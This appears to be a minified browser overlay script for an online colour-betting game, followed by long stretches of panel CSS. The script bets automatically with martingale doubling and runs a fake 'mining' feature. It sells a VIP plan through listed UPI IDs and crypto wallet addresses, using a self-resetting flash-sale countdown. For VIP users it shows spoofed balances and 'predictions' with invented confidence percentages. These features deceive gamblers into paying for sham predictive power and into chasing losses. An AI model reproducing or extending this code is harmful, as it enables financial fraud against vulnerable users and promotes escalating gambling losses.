    if (X(e)) return;
    if (u.code !== 0) {
      if (((o = I()), o)) ((o.pendingResult = !1), pn(o));
      if ((P("Bet was rejected" + (u.msg ? ": " + u.msg : "") + ".", "loss"), R)) {
        V("Stopped.");
        return;
      }
      F = setTimeout(function () {
        cn(e);
      }, 3000);
      return;
    }
  } catch (v) {
    if (
      (P("Network issue while betting. Will check the result when the round ends.", "loss"), X(e))
    )
      return;
    if (R) {
      if (
        (P("Stop requested, but last bet is unverified. It will be checked on next start.", "wait"),
        (x = !1),
        (R = !1),
        F)
      )
        (clearTimeout(F), (F = null));
      Qe();
      return;
    }
    F = setTimeout(
      function () {
        Yn(n, 0, e);
      },
      Math.max(t - Date.now() + 3000, 2000),
    );
    return;
  }
  (P("Bet placed ✓ — waiting for result...", "wait"),
    (F = setTimeout(
      function () {
        Yn(n, 0, e);
      },
      Math.max(t - Date.now() + 3000, 2000),
    )));
}
async function Yn(n, t, e) {
  if (X(e)) return;
  var o = I();
  if (!o || !o.pendingResult || o.lastBetPeriod !== n) return;
  var i = !1,
    l = 0;
  try {
    var f = await mt(n);
    if (X(e)) return;
    if (f && f.data && f.data.status !== void 0)
      ((i = f.data.status === !0), (l = f.data.winAmount || 0));
    else {
      if (t < On) {
        var c = Math.min(3000 * (t + 1), 15000);
        (P("Result not in yet, checking again...", "wait"),
          (F = setTimeout(function () {
            Yn(n, t + 1, e);
          }, c)));
        return;
      }
      V("⚠️ Couldn't get the result. Please check your balance.");
      return;
    }
  } catch ($) {
    if (X(e)) return;
    if (t < On) {
      var c = Math.min(5000 * (t + 1), 15000);
      (P("Error checking result, trying again...", "loss"),
        (F = setTimeout(function () {
          Yn(n, t + 1, e);
        }, c)));
      return;
    }
    V("⚠️ Couldn't get the result after multiple tries. Please check your balance.");
    return;
  }
  if (((o = I()), !o || !o.pendingResult || o.lastBetPeriod !== n)) return;
  var p = De(o, i, l);
  if (p.won) P("✅ WON +₹" + p.net + " (payout ₹" + N(l) + ")", "win");
  else if (((o = I()), o.martingaleStep === 0))
    P("❌ Lost ₹" + N(-p.net) + " — resetting to base bet.", "loss");
  else
    P(
      "❌ Lost ₹" + N(-p.net) + " — doubling next bet (step " + (o.martingaleStep + 1) + "/3)",
      "loss",
    );
  try {
    var w = await qt();
    if (X(e)) return;
    var S = N(w.data.balance);
    ((window.__wg_balance = S),
      window.dispatchEvent(
        new CustomEvent("wg-balance", {
          detail: {
            balance: S,
          },
        }),
      ),
      (o = I()),
      P(
        "\uD83D\uDCB0 Balance: ₹" +
          S +
          " | Profit: ₹" +
          N(o.stats.netPL) +
          " | " +
          o.stats.wins +
          "W/" +
          o.stats.losses +
          "L",
        "active",
      ));
  } catch ($) {}
  if (R) {
    V("Stopped.");
    return;
  }
  cn(e);
}
function yn(n) {
  let t = n.querySelector("#btn-mining-back"),
    e = n.querySelector("#btn-mining-start"),
    o = n.querySelector("#mine-target-goal"),
    i = n.querySelector("#mine-stop-loss"),
    l = n.querySelector("#mine-current-bal"),
    f = n.querySelector("#mine-energy-count"),
    c = n.querySelector("#mine-console"),
    p = n.querySelector("#mining-energy-modal"),
    w = n.querySelector("#btn-energy-topup"),
    S = n.querySelector("#btn-energy-boost"),
    $ = n.querySelector("#btn-energy-close"),
    g = n.querySelector("#btn-mining-history"),
    M = n.querySelector("#mining-history-modal"),
    W = n.querySelector("#btn-history-close"),
    L = n.querySelector("#btn-history-clear"),
    q = n.querySelector("#mining-history-list"),
    y = 0;
  if (f) f.textContent = y;
  let a = () => {
    let C = window.__wg_balance || 0;
    if (window.__wgSpoofer && window.__wgSpoofer.isVip())
      try {
        let O = JSON.parse(localStorage.getItem("wg_spoof_state"));
        if (O && O.balance !== null) C = O.balance;
      } catch (O) {}
    if (l) l.textContent = "₹" + Number(C).toFixed(2);
  };
  a();
  let u = (C, O) => {
      if (!c) return;
      let J = document.createElement("div");
      ((J.className = "console-line" + (O ? " " + O : "")),
        (J.textContent = "[" + new Date().toLocaleTimeString() + "] " + C),
        c.appendChild(J),
        (c.scrollTop = c.scrollHeight));
    },
    v = (C) => {
      if (!e) return;
      if (C) ((e.textContent = "Stop Mining"), e.classList.add("active"));
      else ((e.textContent = "Start Mining · 1 Energy"), e.classList.remove("active"));
    };
  if (
    (Ne(),
    Pe((C, O) => {
      u(C, O);
    }),
    Ge((C) => {
      if ((a(), C && !C.active)) {
        if ((v(!1), o)) o.disabled = !1;
        if (i) i.disabled = !1;
      }
    }),
    yn._onBalance)
  )
    window.removeEventListener("wg-balance", yn._onBalance);
  if (((yn._onBalance = () => a()), window.addEventListener("wg-balance", yn._onBalance), t))
    t.addEventListener("click", () => {
      let C = n.host;
      if (C && typeof C._setView === "function") C._setView("menu");
    });
  if (S)
    S.addEventListener("click", () => {
      if (((y = 1), f)) f.textContent = y;
      if (p) p.style.display = "none";
      u("Energy recharged — you're good to go.", "win");
    });
  if (w)
    w.addEventListener("click", () => {
      u("Paid energy is coming soon. Use the free option for now.", "wait");
    });
  if ($)
    $.addEventListener("click", () => {
      if (p) p.style.display = "none";
    });
  function r() {
    if (!q) return;
    q.innerHTML = "";
    var C = Mt();
    C.forEach(function (O) {
      var J = document.createElement("div");
      J.className = "hist-entry";
      var H = O.side === "BigSmall_Big" ? "BIG" : "SML";
      ((J.innerHTML =
        '<span class="hist-side ' +
        O.side +
        '">' +
        H +
        "</span>" +
        '<span class="hist-amt">₹' +
        O.amount +
        '</span><span class="hist-net ' +
        O.result +
        '">' +
        (O.net >= 0 ? "+" : "") +
        "₹" +
        Math.abs(O.net).toFixed(2) +
        '</span><span class="hist-time">' +
        new Date(O.time).toLocaleTimeString() +
        "</span>"),
        q.appendChild(J));
    });
  }
  if (g)
    g.addEventListener("click", () => {
      if ((r(), M)) M.style.display = "flex";
    });
  if (W)
    W.addEventListener("click", () => {
      if (M) M.style.display = "none";
    });
  if (L)
    L.addEventListener("click", () => {
      (Ie(), r());
    });
  if (e)
    e.addEventListener("click", async () => {
      if (Xe()) {
        Fe();
        return;
      }
      var C = window.__wg_balance || 0,
        O = parseFloat(o ? o.value : "0") || 0,
        J = parseFloat(i ? i.value : "0") || 0;
      if (O <= C) {
        u("Set a target higher than your current balance.", "loss");
        return;
      }
      if (J && J >= C) {
        u("Stop-loss must be lower than your current balance.", "loss");
        return;
      }
      if (c) c.innerHTML = "";
      if ((v(!0), o)) o.disabled = !0;
      if (i) i.disabled = !0;
      var H = await Ye(C, O, J);
      if (!H) {
        if ((v(!1), o)) o.disabled = !1;
        if (i) i.disabled = !1;
      }
    });
  (async () => {
    var C = await Ke();
    if (C) {
      if ((v(!0), o)) o.disabled = !0;
      if (i) i.disabled = !0;
      var O = Ze();
      if (O) {
        if (o) o.value = O.targetBalance;
        if (i && O.stopLoss) i.value = O.stopLoss;
      }
    }
  })();
}
var K = {
  upi: ["upflastkismat@ptyes", "adrenox1@ybl", "anthropic1@upi"],
  crypto: {
    trc20: "TEQzuoAUiBEP8i5H1QhUBvKgGkJmFV3hVN",
    bep20: "0x30c139ADe43773B96B2Fb344A2c317de6C564058",
  },
  amount: 1499,
  originalAmount: 2399,
  flashDurationMs: 7200000,
  flashTimerKey: "vip_flash_sale_end_v1",
  cryptoAmountUsd: 24,
};
var vn,
  Fn,
  Kn = 0;
function Re() {
  try {
    let n = parseInt(localStorage.getItem(K.flashTimerKey) || "0");
    if (n) return n;
    let t = Date.now() + K.flashDurationMs;
    return (localStorage.setItem(K.flashTimerKey, t.toString()), t);
  } catch (n) {
    return Date.now() + K.flashDurationMs;
  }
}
function be(n) {
  let t = Math.max(0, n - Date.now()),
    e = Math.floor(t / 3600000)
      .toString()
      .padStart(2, "0"),
    o = Math.floor((t % 3600000) / 60000)
      .toString()
      .padStart(2, "0"),
    i = Math.floor((t % 60000) / 1000)
      .toString()
      .padStart(2, "0");
  return {
    text: `${e}:${o}:${i}`,
    done: t <= 0,
  };
}
function Do(n) {
  if (Fn) clearInterval(Fn);
  let t = Re(),
    e = () => {
      let o = be(t);
      if (
        (n.querySelectorAll("[data-vip-flash-timer]").forEach((i) => (i.textContent = o.text)),
        o.done)
      )
        clearInterval(Fn);
    };
  if ((e(), t > Date.now())) Fn = setInterval(e, 1000);
}
var Bo = "",
  Ao = "",
  so = "/#/register",
  Ro = "/#/wallet/Recharge",
  bo = "cqz6091.com".includes("91club") ? "light" : "light",
  Be = "";
function _(n) {
  let t = String(n == null ? "" : n).trim();
  return /^\d{8,22}$/.test(t) ? t : "";
}
function Ae(n) {
  if (((n = _(n)), !n)) return "";
  try {
    return (BigInt(n) + 1n).toString();
  } catch (t) {
    return "";
  }
}
function To(n, t) {
  if (((n = _(n)), (t = _(t)), !n || !t)) return 0;
  try {
    let e = BigInt(n),
      o = BigInt(t);
    return e > o ? 1 : e < o ? -1 : 0;
  } catch (e) {
    return n > t ? 1 : n < t ? -1 : 0;
  }
}
function xo(n, t, e) {
  let o = n.querySelector("#pred-history");
  if (!o) return;
  let i = (e || []).slice(0, 8),
    l = _(i[0]?.issueNumber ?? i[0]?.issue),
    f = t + ":" + l + ":" + i.map((w) => w.number || w.num || w).join(",");
  if (f === Be) return;
  Be = f;
  let c = document.createDocumentFragment(),
    p = document.createElement("span");
  if (((p.className = "hist-label"), (p.textContent = "Recent"), c.appendChild(p), i.length < 2)) {
    (o.replaceChildren(c), (o.style.display = "none"));
    return;
  }
  (i.forEach((w) => {
    let S = parseInt(w.number || w.num || w),
      $ = document.createElement("span");
    (($.className = "hist-dot " + (S >= 5 ? "big" : "small")),
      ($.title = (S >= 5 ? "Big" : "Small") + ": " + S),
      c.appendChild($));
  }),
    o.replaceChildren(c),
    (o.style.display = "flex"));
}
function jo(n, t) {
  let e = n.querySelector("#streak-badge"),
    o = n.querySelector("#streak-text");
  if (!e || !o) return;
  if (t.streak && t.streak.len >= 3)
    ((o.textContent = t.streak.len + "× " + t.streak.side), (e.style.display = "flex"));
  else e.style.display = "none";
}
var se = "";
function Te() {
  let n = document.querySelector("prediction-panel")?.shadowRoot;
  if (!n) return;
  let t = ct(),
    e = In(),
    o = oe(),
    i = window.__wgSpoofer,
    l = i && i.isVip();
  if (!t.length && !(l && e && _(o))) {
    (tn("loading"), en(), ae());
    return;
  }
  let f = _(t[0]?.issueNumber ?? t[0]?.issue),
    c = _(o);
  if (f && (!c || To(c, f) <= 0)) c = Ae(f);
  let p = _(ie());
  if (p && c && Ae(p) !== c) {
    tn("loading");
    return;
  }
  let w = [
    e,
    f,
    c,
    t
      .slice(0, 8)
      .map((y) => y.number || y.num || y)
      .join(","),
  ].join("|");
  if (w === se) {
    tn("result");
    return;
  }
  se = w;
  let S;
  if (l && e && c) {
    let y = i.predictNum(e, c),
      a = y === 0 || y === 5 ? "violet" : y % 2 === 0 ? "red" : "green";
    S = {
      prediction: y >= 5 ? "Big" : "Small",
      confidence: 73 + ((y * 7 + 3) % 22),
      color: a,
      topNumber: y,
      signals: [],
      heatmap: {
        hot: [],
        cold: [],
      },
      streak: null,
    };
  }
  if (!S) S = Ln(t);
  let $ = S.prediction === "Big",
    g = n.querySelector("#pred-pill");
  ((g.textContent = S.prediction), (g.className = "pred-size " + ($ ? "big" : "small")));
  let M = n.querySelector("#pred-color");
  ((M.textContent = S.color.charAt(0).toUpperCase() + S.color.slice(1)),
    (M.className = "pred-color " + S.color));
  let W = S.topNumber ?? S.heatmap?.hot?.[0] ?? 0;
  ((n.querySelector("#hero-ball").style.backgroundImage = "url('" + dt(W) + "')"),
    (n.querySelector("#pred-glow").className = "pred-glow " + ($ ? "big" : "small")),
    (n.querySelector("#pro-card").className = "pro-card c-" + ($ ? "big" : "small")));
  let L = n.querySelector("#conf-fill");
  ((L.style.width = S.confidence + "%"),
    (L.className = "conf-fill" + ($ ? "" : " small")),
    (n.querySelector("#conf-pct").textContent = S.confidence + "%"),
    xo(n, e, t));
  let q = n.querySelector("#pro-period");
  if (q && c) q.textContent = "#" + c.slice(-6);
  (jo(n, S), n.querySelector("#pro-prediction").classList.toggle("vip-mode", !!l), tn("result"));
}
Ot({
  apiBase: Bo,
  spoofDomain: "cqz6091.com",
  minBalance: 100,
  nukeUrl: so,
  authErrMsg: Ao,
  onBalance: (n) => {
    window.__wg_balance = n;
  },
  onWingo: (n, t) => ue(n, t),
});
At();
pe({
  onPred: Te,
});
if (!customElements.get("prediction-panel"))
  customElements.define(
    "prediction-panel",
    class extends HTMLElement {
      connectedCallback() {
        if (!document.querySelector("link[data-wg-font]")) {
          let g = document.createElement("link");
          ((g.rel = "stylesheet"),
            (g.href =
              "https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap"),
            (g.dataset.wgFont = "1"),
            document.head.appendChild(g));
        }
        ((this._mode = "logo"), this.classList.add(bo));
        let n = this.attachShadow({
          mode: "open",
        });
        n.innerHTML = `<style>
  :host {
    position: fixed;
    z-index: 2147483647;
    touch-action: none;
    user-select: none;
    --f: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    --ease: cubic-bezier(0.4, 0, 0.2, 1);
    --panel-bg: linear-gradient(
      155deg,
      rgba(11, 9, 30, 0.98) 0%,
      rgba(20, 16, 50, 0.97) 100%
    );
    --panel-border: rgba(139, 92, 246, 0.22);
    --panel-shadow:
      0 24px 64px rgba(0, 0, 0, 0.75), 0 0 0 1px rgba(255, 255, 255, 0.06),
      0 0 100px rgba(99, 60, 220, 0.08);
    --hdr-bg: rgba(255, 255, 255, 0.03);
    --hdr-border: rgba(255, 255, 255, 0.07);
    --t-title: #f1f0ff;
    --t-name: #f1f0ff;
    --t-body: rgba(255, 255, 255, 0.52);
    --t-dim: rgba(255, 255, 255, 0.25);
    --x-bg: rgba(255, 255, 255, 0.07);
    --x-col: rgba(255, 255, 255, 0.32);
    --x-bg-h: rgba(255, 255, 255, 0.14);
    --x-col-h: rgba(255, 255, 255, 0.8);
    --card-bg: rgba(255, 255, 255, 0.035);
    --card-bdr: rgba(255, 255, 255, 0.07);
    --back-bg: rgba(255, 255, 255, 0.06);
    --back-bdr: rgba(255, 255, 255, 0.09);
    --back-col: rgba(255, 255, 255, 0.5);
    --back-col-h: rgba(255, 255, 255, 0.9);
    --back-bdr-h: rgba(139, 92, 246, 0.5);
    --pro: #8b5cf6;
    --pro-lt: rgba(139, 92, 246, 0.14);
    --pro-glow: rgba(139, 92, 246, 0.2);
    --pro-txt: #c4b5fd;
    --pro-bdr-h: rgba(139, 92, 246, 0.45);
    --vip: #f59e0b;
    --vip-lt: rgba(245, 158, 11, 0.13);
    --vip-glow: rgba(245, 158, 11, 0.2);
    --vip-txt: #fde68a;
    --vip-bdr-h: rgba(245, 158, 11, 0.45);
    --mine: #10b981;
    --mine-lt: rgba(16, 185, 129, 0.14);
    --mine-glow: rgba(16, 185, 129, 0.2);
    --mine-txt: #a7f3d0;
    --mine-bdr-h: rgba(16, 185, 129, 0.45);
    --upi: #06b6d4;
    --upi-lt: rgba(6, 182, 212, 0.14);
    --upi-glow: rgba(6, 182, 212, 0.2);
    --upi-txt: #a5f3fc;
    --upi-bdr-h: rgba(6, 182, 212, 0.45);
    --crypto: #eab308;
    --crypto-lt: rgba(234, 179, 8, 0.13);
    --crypto-glow: rgba(234, 179, 8, 0.2);
    --crypto-txt: #fef08a;
    --crypto-bdr-h: rgba(234, 179, 8, 0.45);
    --pc-bg: linear-gradient(
      150deg,
      rgba(20, 16, 52, 0.94) 0%,
      rgba(12, 10, 34, 0.97) 100%
    );
    --pc-bdr: rgba(139, 92, 246, 0.16);
    --pc-shad:
      0 10px 36px rgba(0, 0, 0, 0.45), 0 0 0 1px rgba(139, 92, 246, 0.1);
    --tw-bg: rgba(255, 255, 255, 0.04);
    --tw-bdr: rgba(255, 255, 255, 0.07);
    --big: #feaa57;
    --small: #6ea8f4;
    --strip: rgba(255, 255, 255, 0.07);
    --live: #34d399;
    --gate-title: #f1f0ff;
    --gate-bal-bg: rgba(139, 92, 246, 0.12);
    --gate-bal-col: #c4b5fd;
    --gate-bal-bdr: rgba(139, 92, 246, 0.22);
    --stat-bg: rgba(255, 255, 255, 0.03);
    --stat-bdr: rgba(255, 255, 255, 0.07);
    --chev: rgba(255, 255, 255, 0.15);
    --chip-bg: rgba(255, 255, 255, 0.07);
    --chip-bdr: rgba(255, 255, 255, 0.1);
    --chip-col: rgba(255, 255, 255, 0.7);
    --chip-hash: rgba(255, 255, 255, 0.42);
  }
  :host(.light) {
    --panel-bg: linear-gradient(155deg, #ffffff 0%, #fff8f8 100%);
    --panel-border: rgba(249, 89, 89, 0.18);
    --panel-shadow:
      0 16px 52px rgba(180, 30, 30, 0.14), 0 0 0 1px rgba(249, 89, 89, 0.12),
      0 4px 16px rgba(0, 0, 0, 0.06);
    --hdr-bg: linear-gradient(100deg, #f95959 0%, #ff8080 100%);
    --hdr-border: transparent;
    --t-title: #1f1f2e;
    --t-name: #1f1f2e;
    --t-body: #6b7280;
    --t-dim: rgba(0, 0, 0, 0.3);
    --x-bg: rgba(255, 255, 255, 0.22);
    --x-col: rgba(255, 255, 255, 0.85);
    --x-bg-h: rgba(255, 255, 255, 0.36);
    --x-col-h: #fff;
    --card-bg: rgba(0, 0, 0, 0.022);
    --card-bdr: rgba(0, 0, 0, 0.08);
    --back-bg: rgba(0, 0, 0, 0.04);
    --back-bdr: rgba(0, 0, 0, 0.1);
    --back-col: #6b7280;
    --back-col-h: #1f1f2e;
    --back-bdr-h: rgba(224, 60, 60, 0.4);
    --pro: #e03c3c;
    --pro-lt: rgba(224, 60, 60, 0.08);
    --pro-glow: rgba(224, 60, 60, 0.14);
    --pro-txt: #c0392b;
    --pro-bdr-h: rgba(224, 60, 60, 0.4);
    --vip: #d97706;
    --vip-lt: rgba(217, 119, 6, 0.08);
    --vip-glow: rgba(217, 119, 6, 0.13);
    --vip-txt: #b45309;
    --vip-bdr-h: rgba(217, 119, 6, 0.4);
    --mine: #059669;
    --mine-lt: rgba(5, 150, 105, 0.08);
    --mine-glow: rgba(5, 150, 105, 0.13);
    --mine-txt: #047857;
    --mine-bdr-h: rgba(5, 150, 105, 0.4);
    --upi: #0891b2;
    --upi-lt: rgba(8, 145, 178, 0.08);
    --upi-glow: rgba(8, 145, 178, 0.13);
    --upi-txt: #0e7490;
    --upi-bdr-h: rgba(8, 145, 178, 0.4);
    --crypto: #ca8a04;
    --crypto-lt: rgba(202, 138, 4, 0.08);
    --crypto-glow: rgba(202, 138, 4, 0.13);
    --crypto-txt: #854d0e;
    --crypto-bdr-h: rgba(202, 138, 4, 0.4);
    --pc-bg: linear-gradient(150deg, #ffffff 0%, #f9f0ff 100%);
    --pc-bdr: rgba(224, 60, 60, 0.14);
    --pc-shad:
      0 6px 24px rgba(0, 0, 0, 0.08), 0 0 0 1px rgba(224, 60, 60, 0.08);
    --tw-bg: rgba(0, 0, 0, 0.025);
    --tw-bdr: rgba(0, 0, 0, 0.08);
    --strip: rgba(0, 0, 0, 0.07);
    --gate-title: #111827;
    --gate-bal-bg: rgba(220, 38, 38, 0.07);
    --gate-bal-col: #dc2626;
    --gate-bal-bdr: rgba(220, 38, 38, 0.14);
    --stat-bg: rgba(0, 0, 0, 0.025);
    --stat-bdr: rgba(0, 0, 0, 0.07);
    --chev: rgba(0, 0, 0, 0.14);
    --chip-bg: rgba(249, 89, 89, 0.08);
    --chip-bdr: rgba(249, 89, 89, 0.16);
    --chip-col: #374151;
    --chip-hash: #9ca3af;
  }
  .logo {
    width: 50px;
    height: 50px;
    border-radius: 50%;
    overflow: hidden;
    cursor: grab;
    display: block;
    transition:
      box-shadow 0.22s,
      transform 0.22s;
    box-shadow:
      0 4px 20px rgba(0, 0, 0, 0.45),
      0 0 0 2.5px rgba(255, 255, 255, 0.15),
      0 0 0 5px rgba(139, 92, 246, 0.08);
  }
  .logo:hover {
    box-shadow:
      0 6px 26px rgba(0, 0, 0, 0.55),
      0 0 0 2.5px rgba(255, 255, 255, 0.25),
      0 0 0 6px rgba(139, 92, 246, 0.14);
    transform: scale(1.06);
  }
  .logo.dragging {
    cursor: grabbing;
    transform: scale(0.93);
    box-shadow: 0 8px 30px rgba(0, 0, 0, 0.6);
  }
  .logo img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    display: block;
    pointer-events: none;
  }
  :host(.light) .logo {
    box-shadow:
      0 4px 18px rgba(200, 50, 50, 0.3),
      0 0 0 2.5px rgba(249, 89, 89, 0.28),
      0 0 0 5px rgba(249, 89, 89, 0.1);
  }
  :host(.light) .logo:hover {
    box-shadow:
      0 6px 24px rgba(200, 50, 50, 0.4),
      0 0 0 2.5px rgba(249, 89, 89, 0.4),
      0 0 0 6px rgba(249, 89, 89, 0.14);
  }
  :host([data-route="other"]) .logo,
  :host([data-route="other"]) .panel {
    display: none !important;
  }
  .panel {
    display: none;
    width: min(86vw, 288px);
    border-radius: 20px;
    overflow: hidden;
    background: var(--panel-bg);
    border: 1px solid var(--panel-border);
    box-shadow: var(--panel-shadow);
    backdrop-filter: blur(36px);
    -webkit-backdrop-filter: blur(36px);
    font-family: var(--f);
  }
  .panel.active {
    display: block;
    animation: panelIn 0.22s var(--ease);
  }
  @keyframes panelIn {
    from {
      opacity: 0;
      transform: scale(0.91) translateY(8px);
    }
    to {
      opacity: 1;
      transform: scale(1) translateY(0);
    }
  }
  .panel-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 11px 13px;
    cursor: grab;
    background: var(--hdr-bg);
    border-bottom: 1px solid var(--hdr-border);
  }
  .panel-header.dragging {
    cursor: grabbing;
  }
  .panel-title {
    display: flex;
    align-items: center;
    gap: 6px;
    font-size: 13px;
    font-weight: 700;
    color: var(--t-title);
    letter-spacing: -0.1px;
  }
  :host(.light) .panel-title {
    color: #fff;
  }
  .panel-title img {
    width: 20px;
    height: 20px;
    border-radius: 50%;
    box-shadow: 0 1px 6px rgba(0, 0, 0, 0.25);
    cursor: pointer;
    touch-action: manipulation;
    position: relative;
    z-index: 1;
  }
  .brand-pw {
    font-size: 14px;
    font-weight: 800;
    letter-spacing: 0.2px;
    color: #fff;
    position: relative;
    display: inline-flex;
    align-items: baseline;
  }
  .pw-in {
    position: relative;
    display: inline-block;
  }
  .pw-i {
    position: relative;
    display: inline-block;
  }
  .pw-star {
    position: absolute;
    top: 2px;
    left: 50%;
    transform: translateX(-50%);
    width: 8px;
    height: 8px;
    color: #facc15;
    filter: drop-shadow(0 1px 1px rgba(0, 0, 0, 0.2));
  }
  .pw-smile {
    position: absolute;
    bottom: -2px;
    left: 50%;
    transform: translateX(-45%);
    width: 16px;
    height: 6px;
    stroke: #fff;
    filter: drop-shadow(0 1px 1px rgba(0, 0, 0, 0.15));
  }
  .ai-badge {
    padding: 1px 5px;
    border-radius: 4px;
    font-size: 8.5px;
    font-weight: 700;
    letter-spacing: 0.8px;
    background: transparent;
    border: 1px solid rgba(255, 255, 255, 0.35);
    color: rgba(255, 255, 255, 0.8);
    line-height: 1.5;
  }
  :host(.light) .ai-badge {
    border-color: rgba(255, 255, 255, 0.5);
    color: rgba(255, 255, 255, 0.9);
  }
  .pw-tld {
    font-weight: 500;
    opacity: 0.55;
    font-size: 11px;
  }
  .close-btn {
    width: 24px;
    height: 24px;
    border-radius: 7px;
    border: none;
    background: var(--x-bg);
    color: var(--x-col);
    font-size: 11px;
    cursor: pointer;
    line-height: 1;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: var(--f);
    transition: all 0.15s;
  }
  .close-btn:hover {
    background: var(--x-bg-h);
    color: var(--x-col-h);
  }
  .panel-body {
    padding: 14px 12px 13px;
    color: var(--t-body);
    font-size: 12px;
    line-height: 1.5;
    animation: fadeUp 0.24s var(--ease) 0.04s both;
  }
  @keyframes fadeUp {
    from {
      opacity: 0;
      transform: translateY(8px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }
  .view {
    display: none;
  }
  .view.active {
    display: block;
    animation: viewIn 0.2s var(--ease);
  }
  @keyframes viewIn {
    from {
      opacity: 0;
      transform: translateX(8px);
    }
    to {
      opacity: 1;
      transform: translateX(0);
    }
  }
  .view.active {
    display: block;
    animation: viewIn 0.2s var(--ease);
  }
  .view-menu.active {
    animation: vipFadeIn 0.16s cubic-bezier(0.16, 1, 0.3, 1) both;
  }
  @keyframes viewIn {
    from {
      opacity: 0;
      transform: translateX(8px);
    }
    to {
      opacity: 1;
      transform: translateX(0);
    }
  } /* ── Main Menu ── */
  .menu-shell {
    display: flex;
    flex-direction: column;
  }
  .menu-home-card {
    background: var(--card-bg);
    border: 1px solid var(--card-bdr);
    border-radius: 14px;
    overflow: hidden;
    position: relative;
  }
  .menu-home-card::before {
    content: "";
    position: absolute;
    top: -1px;
    left: 14px;
    right: 14px;
    height: 1px;
    background: linear-gradient(
      90deg,
      transparent,
      color-mix(in srgb, var(--pro) 28%, transparent),
      transparent
    );
    pointer-events: none;
  }
  .menu-home-opt {
    display: flex;
    align-items: center;
    gap: 10px;
    width: 100%;
    padding: 11px 12px;
    border: none;
    background: transparent;
    cursor: pointer;
    text-align: left;
    font-family: var(--f);
    transition:
      background 0.16s var(--ease),
      transform 0.16s var(--ease);
  }
  .menu-home-opt + .menu-home-opt {
    border-top: 1px solid var(--strip);
  }
  .menu-home-opt:hover {
    background: var(--strip);
  }
  .menu-home-opt:active {
    transform: scale(0.99);
    transition-duration: 0.06s;
  }
  .menu-home-icon {
    width: 36px;
    height: 36px;
    border-radius: 10px;
    flex-shrink: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: transform 0.18s var(--ease);
  }
  .menu-home-icon svg {
    width: 18px;
    height: 18px;
    fill: currentColor;
  }
  .menu-home-pro .menu-home-icon {
    background: var(--pro-lt);
    color: var(--pro);
  }
  .menu-home-vip .menu-home-icon {
    background: var(--vip-lt);
    color: var(--vip);
  }
  .menu-home-mine .menu-home-icon {
    background: var(--mine-lt);
    color: var(--mine);
  }
  .menu-home-opt:hover .menu-home-icon {
    transform: scale(1.05);
  }
  .menu-home-body {
    flex: 1;
    min-width: 0;
  }
  .menu-home-top {
    display: flex;
    align-items: center;
    gap: 6px;
    margin-bottom: 1px;
  }
  .menu-home-name {
    font-size: 13px;
    font-weight: 700;
    letter-spacing: -0.15px;
    color: var(--t-title);
  }
  .menu-home-desc {
    display: block;
    font-size: 10px;
    font-weight: 500;
    color: var(--t-body);
    letter-spacing: 0.02px;
  }
  .menu-home-arrow {
    width: 12px;
    height: 12px;
    flex-shrink: 0;
    stroke: var(--t-dim);
    stroke-width: 2.5;
    stroke-linecap: round;
    stroke-linejoin: round;
    fill: none;
    opacity: 0;
    transform: translateX(-4px);
    transition:
      opacity 0.16s var(--ease),
      transform 0.16s var(--ease),
      stroke 0.16s var(--ease);
  }
  .menu-home-pro:hover .menu-home-arrow {
    opacity: 0.75;
    transform: translateX(0);
    stroke: var(--pro);
  }
  .menu-home-vip:hover .menu-home-arrow {
    opacity: 0.75;
    transform: translateX(0);
    stroke: var(--vip);
  }
  .menu-home-mine:hover .menu-home-arrow {
    opacity: 0.75;
    transform: translateX(0);
    stroke: var(--mine);
  }
  .menu-home-foot {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    padding-top: 9px;
    margin-top: 8px;
    border-top: 1px solid var(--strip);
    font-size: 9.5px;
    color: var(--t-dim);
    font-weight: 500;
  }
  .menu-home-live {
    display: flex;
    align-items: center;
    gap: 4px;
  }
  .menu-home-live .status-dot {
    width: 4px;
    height: 4px;
  }
  .menu-home-foot-sep {
    opacity: 0.2;
    font-size: 9px;
    font-weight: 300;
  }
  .menu-home-tg {
    display: inline-flex;
    align-items: center;
    gap: 3px;
    border: none;
    background: transparent;
    padding: 0;
    font-family: var(--f);
    font-size: 9.5px;
    font-weight: 500;
    color: #2aabee;
    cursor: pointer;
    transition:
      opacity 0.15s,
      transform 0.15s;
  }
  .menu-home-tg:hover {
    opacity: 0.85;
  }
  .menu-home-tg:active {
    transform: scale(0.98);
  }
  .menu-home-tg svg {
    flex-shrink: 0;
    width: 10px;
    height: 10px;
  }
  .card-badge {
    font-size: 8px;
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    padding: 2px 7px;
    border-radius: 50px;
    border: 1px solid transparent;
  }
  .badge-pro {
    background: var(--pro-lt);
    color: var(--pro-txt);
    border-color: var(--pro-bdr-h);
  }
  .badge-vip {
    background: var(--vip-lt);
    color: var(--vip-txt);
    border-color: var(--vip-bdr-h);
  }
  .badge-mine {
    background: var(--mine-lt);
    color: var(--mine-txt);
    border-color: var(--mine-bdr-h);
  }
  .badge-upi {
    background: var(--upi-lt);
    color: var(--upi-txt);
    border-color: var(--upi-bdr-h);
  }
  .badge-crypto {
    background: var(--crypto-lt);
    color: var(--crypto-txt);
    border-color: var(--crypto-bdr-h);
  }
  .status-row {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    padding: 9px 0 0;
    margin-top: 9px;
    border-top: 1px solid var(--strip);
    font-size: 10px;
    color: var(--t-dim);
    font-weight: 500;
    letter-spacing: 0.2px;
  }
  .status-live {
    display: flex;
    align-items: center;
    gap: 5px;
  }
  .status-dot {
    width: 5px;
    height: 5px;
    border-radius: 50%;
    background: var(--live);
    flex-shrink: 0;
    animation: livePulse 2.4s ease-in-out infinite;
  }
  .status-sep {
    color: var(--t-dim);
    opacity: 0.35;
  }
  .status-tg-btn {
    display: inline-flex;
    align-items: center;
    gap: 4px;
    border: none;
    background: transparent;
    padding: 2px 6px;
    font-family: var(--f);
    font-size: 10px;
    font-weight: 600;
    color: #2aabee;
    cursor: pointer;
    transition:
      opacity 0.15s,
      transform 0.15s;
    border-radius: 6px;
  }
  .status-tg-btn:hover {
    opacity: 0.85;
  }
  .status-tg-btn:active {
    transform: scale(0.96);
  }
